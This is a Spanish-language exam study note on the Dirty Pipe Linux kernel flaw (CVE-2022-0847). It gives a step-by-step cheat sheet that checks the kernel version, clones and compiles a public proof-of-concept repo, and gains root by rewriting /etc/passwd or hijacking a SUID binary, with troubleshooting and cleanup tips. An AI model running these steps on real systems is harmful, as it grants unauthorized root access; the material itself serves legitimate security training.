---
tags:
  - linux
  - privex
  - cve
---
## Conceptos Clave (TL;DR)

- Vulnerabilidad en el kernel de Linux que permite **escritura arbitraria en archivos sobre los que solo tienes permiso de LECTURA** (no necesita escritura). Es la "evolución" técnica de Dirty COW (2016).
- Vector de **escalada de privilegios local (LPE)** a root. Afecta a **kernels 5.8 a 5.17** (ambos inclusive). Fuera de ese rango, no es explotable.
- Se basa en un fallo en el mecanismo de **pipes** (comunicación unidireccional entre procesos en Unix). Permite inyectar datos en el page cache de archivos de root.
- Caso de uso clásico: reescribir `/etc/passwd` para eliminar la contraseña de root, o secuestrar un binario SUID-root. También afecta a Android (apps corren con permisos de usuario), pero eso es contexto, no aplicable al examen Linux.

## Herramientas Clave

- **git**: clonar el repositorio del PoC con los exploits precompilables.
- **CVE-2022-0847-DirtyPipe-Exploits** (repo de AlexisAhmed): contiene `exploit-1` (vía /etc/passwd) y `exploit-2` (vía secuestro de binario SUID).
- **compile.sh**: script incluido en el repo que compila ambos exploits desde el código fuente C.
- **uname -r**: verificar la versión del kernel para confirmar si el objetivo es vulnerable ANTES de gastar tiempo.
- **find**: enumerar binarios SUID candidatos para `exploit-2`.

## Metodología Paso a Paso

### Fase 1 - Verificación de vulnerabilidad (Enumeración)
Comprueba la versión del kernel con `uname -r`. Lógica: Dirty Pipe solo afecta a 5.8-5.17. Este es un check rápido de "quick win" durante la enumeración de privesc; si la versión no encaja, descarta el vector y sigue buscando.

### Fase 2 - Descarga y compilación del PoC
Clona el repo y ejecuta `compile.sh`. Lógica: el exploit es código C que debe compilarse **en el propio objetivo** (o en una copia idéntica), porque el binario depende de la arquitectura y librerías del sistema. La compilación genera `exploit-1` y `exploit-2`.

### Fase 3 - Explotación Vía A: reescritura de /etc/passwd (exploit-1)
Ejecuta `./exploit-1`. Lógica: abusa de la escritura arbitraria para sobrescribir la entrada de root en `/etc/passwd` (le pone la contraseña `piped`), abre una shell root y restaura el archivo desde el backup automático en `/tmp/passwd.bak`. Es el método más limpio y directo a root.

### Fase 4 - Explotación Vía B: secuestro de binario SUID (exploit-2)
Primero enumera binarios SUID con `find / -perm -4000`. Luego ejecuta `./exploit-2 <RUTA>`. Lógica: secuestra temporalmente un binario SUID-root existente, suelta una shell SUID, abre root y restaura el binario original. Útil si tocar `/etc/passwd` no es deseable o falla.

## Cheat Sheet de Comandos

```bash
# Verificar version del kernel. Confirma que esta entre 5.8 y 5.17 (rango vulnerable)
uname -r
```

```bash
# Clonar el PoC publico (incluye exploit-1 y exploit-2 ya listos para compilar)
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git

# Entrar al directorio del exploit
cd CVE-2022-0847-DirtyPipe-Exploits

# Compilar AMBOS exploits EN EL OBJETIVO. Genera los binarios exploit-1 y exploit-2
bash compile.sh
```

```bash
# VIA A -> Reescribe /etc/passwd (pass de root = "piped"), restaura backup y abre shell root
./exploit-1
```

```bash
# Enumerar binarios SUID candidatos para exploit-2
# -perm -4000 = filtra archivos con el bit SUID activo | 2>/dev/null = silencia errores de "permission denied"
find / -perm -4000 2>/dev/null
```

```bash
# VIA B -> Secuestra un binario SUID-root existente y abre shell root
# Reemplaza <SUID_BINARY_PATH> por la ruta COMPLETA de un binario SUID encontrado (ej. /usr/bin/sudo, /usr/bin/passwd)
./exploit-2 <SUID_BINARY_PATH>
```

```bash
# Confirmar que ya eres root tras cualquiera de las dos vias
id
# Salida esperada -> uid=0(root) gid=0(root) groups=0(root)...
```

```bash
# LIMPIEZA (post-exploit-2): el exploit deja una shell SUID en /tmp/sh. ELIMINALA
rm /tmp/sh
```

## "Gotchas" y Troubleshooting

- **Rango de kernel estricto**: solo 5.8 a 5.17. Si `uname -r` devuelve algo fuera de ese rango, no pierdas tiempo, el exploit no funcionara. En kernels mas antiguos, considera **Dirty COW** como alternativa (vector tecnicamente similar).
- **Compilar en el objetivo, NO en el atacante**: el binario depende de arquitectura/librerias del sistema victima. Compilarlo en tu maquina de ataque con otro kernel/arch y subirlo suele fallar. Si no hay compilador en el objetivo, compila en una copia/VM identica.
- **Solo requiere permiso de LECTURA**: el truco clave es que un usuario sin privilegios puede escribir `/etc/passwd` porque solo necesita poder leerlo. No te confundas buscando permisos de escritura.
- **exploit-1 toca /etc/passwd**: hace backup en `/tmp/passwd.bak` y lo restaura solo. Si el exploit se corta a medias y te deja sin login, restaura manualmente: `cp /tmp/passwd.bak /etc/passwd`.
- **exploit-2 necesita la RUTA COMPLETA** de un binario SUID como argumento, no el nombre suelto. Por eso es obligatorio el `find` previo. Si un binario falla, prueba con otro de la lista (`/usr/bin/sudo`, `/usr/bin/passwd`, `/usr/bin/mount`, etc.).
- **Limpieza obligatoria tras exploit-2**: deja una shell SUID en `/tmp/sh`. En el examen, eliminala (`rm /tmp/sh`) para no dejar una backdoor/artefacto y mantener el sistema limpio.
- **Artefactos que dejas**: `/tmp/passwd.bak` (exploit-1) y `/tmp/sh` (exploit-2). Tenlos en el radar si haces cleanup o si el objetivo es compartido.